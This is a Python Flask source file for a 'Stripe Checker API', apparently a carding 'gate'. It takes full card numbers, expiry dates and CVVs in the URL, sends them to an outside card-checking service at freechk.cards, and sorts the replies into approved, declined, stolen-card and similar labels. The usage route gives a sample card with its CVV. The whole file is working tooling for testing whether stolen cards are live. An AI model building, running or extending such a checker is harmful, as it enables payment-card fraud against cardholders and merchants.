from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

# Configuration
STRIPE_API_URL = "https://freechk.cards/free/stripe.php?lista="

def parse_stripe_response(text):
    """
    Parse the Stripe API response and extract relevant information
    """
    if not text:
        return "No response", "declined", "NO_RESPONSE"
    
    # Common response patterns from Stripe
    response_mapping = {
        "Your card was declined": ("Card Declined", "declined", "CARD_DECLINED"),
        "card was declined": ("Card Declined", "declined", "CARD_DECLINED"),
        "approved": ("Approved", "approved", "APPROVED"),
        "success": ("Success", "approved", "SUCCESS"),
        "insufficient funds": ("Insufficient Funds", "declined", "INSUFFICIENT_FUNDS"),
        "invalid card": ("Invalid Card", "declined", "INVALID_CARD"),
        "incorrect cvc": ("Incorrect CVC", "declined", "INCORRECT_CVC"),
        "expired card": ("Expired Card", "declined", "EXPIRED_CARD"),
        "transaction not allowed": ("Transaction Not Allowed", "declined", "TRANSACTION_NOT_ALLOWED"),
        "do not honor": ("Do Not Honor", "declined", "DO_NOT_HONOR"),
        "stolen card": ("Stolen Card", "declined", "STOLEN_CARD"),
        "lost card": ("Lost Card", "declined", "LOST_CARD"),
        "pickup card": ("Pickup Card", "declined", "PICKUP_CARD")
    }
    
    # Check for specific patterns in response
    text_lower = text.lower()
    
    for pattern, (message, status, code) in response_mapping.items():
        if pattern in text_lower:
            return message, status, code
    
    # If no specific pattern found, return the sanitized text
    return sanitize_response(text), "unknown", "UNKNOWN_RESPONSE"

def sanitize_response(text):
    """
    Remove usernames, links, and @ mentions from response text
    """
    if not text:
        return ""
    
    # Remove @mentions (usernames)
    text = re.sub(r'@\w+', '', text)
    
    # Remove URLs
    text = re.sub(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', '', text)
    
    # Remove common link patterns
    text = re.sub(r'www\.\w+\.\w+', '', text)
    
    return text.strip()

def parse_cc_parameter(cc_param):
    """
    Parse CC parameter in different formats (with | separator)
    Returns: cc, mm, yyyy, cvv
    """
    parts = cc_param.split('|')
    
    if len(parts) == 4:
        cc, mm, yyyy_or_yy, cvv = parts
        
        # Handle year format (yy or yyyy)
        if len(yyyy_or_yy) == 2:
            yyyy = f"20{yyyy_or_yy}"  # Assuming 21st century
        else:
            yyyy = yyyy_or_yy
            
        return cc, mm, yyyy, cvv
    
    return None, None, None, None

@app.route('/gate=OnyxEnvBot/Stripe_Auth/cc=<path:cc_param>')
def stripe_auth(cc_param):
    """
    Stripe authentication endpoint
    """
    try:
        # Parse the CC parameter
        cc, mm, yyyy, cvv = parse_cc_parameter(cc_param)
        
        if not all([cc, mm, yyyy, cvv]):
            return jsonify({
                "code": "INVALID_PARAMETERS",
                "message": "Invalid credit card parameter format. Use: cc|mm|yyyy|cvv or cc|mm|yy|cvv",
                "status": "declined"
            }), 400
        
        # Build the target URL for Stripe API
        stripe_url = f"{STRIPE_API_URL}{cc}|{mm}|{yyyy}|{cvv}"
        
        # Make request to Stripe API
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*'
        }
        
        response = requests.get(stripe_url, headers=headers, timeout=30)
        
        if response.status_code == 200:
            # Parse the response
            message, status, code = parse_stripe_response(response.text)
            
            # Return formatted response
            return jsonify({
                "cc": f"{cc}|{mm}|{yyyy}|{cvv}",
                "response": message,
                "status": status,
                "code": code,
                "gate": "Stripe_Auth",
                "processor": "OnyxEnvBot"
            })
        else:
            return jsonify({
                "code": "STRIPE_API_ERROR",
                "message": f"Stripe API returned status {response.status_code}",
                "status": "error",
                "gate": "Stripe_Auth",
                "processor": "OnyxEnvBot"
            }), 502
            
    except requests.exceptions.Timeout:
        return jsonify({
            "code": "TIMEOUT_ERROR",
            "message": "Request to Stripe API timed out",
            "status": "error",
            "gate": "Stripe_Auth",
            "processor": "OnyxEnvBot"
        }), 504
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            "code": "NETWORK_ERROR",
            "message": f"Network error: {str(e)}",
            "status": "error",
            "gate": "Stripe_Auth", 
            "processor": "OnyxEnvBot"
        }), 503
        
    except Exception as e:
        return jsonify({
            "code": "INTERNAL_ERROR",
            "message": f"Internal server error: {str(e)}",
            "status": "error",
            "gate": "Stripe_Auth",
            "processor": "OnyxEnvBot"
        }), 500

@app.route('/test')
def test_endpoint():
    """
    Test endpoint to check if API is working
    """
    return jsonify({
        "status": "API is running",
        "service": "Stripe Checker API",
        "timestamp": "2024-01-01 00:00:00"
    })

@app.route('/health')
def health_check():
    """
    Health check endpoint for monitoring
    """
    return jsonify({"status": "healthy", "service": "Stripe Checker API"})

@app.route('/')
def home():
    """
    Home endpoint with usage information
    """
    return jsonify({
        "service": "Stripe Checker API",
        "usage": "/gate=OnyxEnvBot/Stripe_Auth/cc=CC|MM|YYYY|CVV",
        "example": "/gate=OnyxEnvBot/Stripe_Auth/cc=4147768578745265|04|2026|168",
        "note": "Direct connection to freechk.cards Stripe API - No proxies required"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
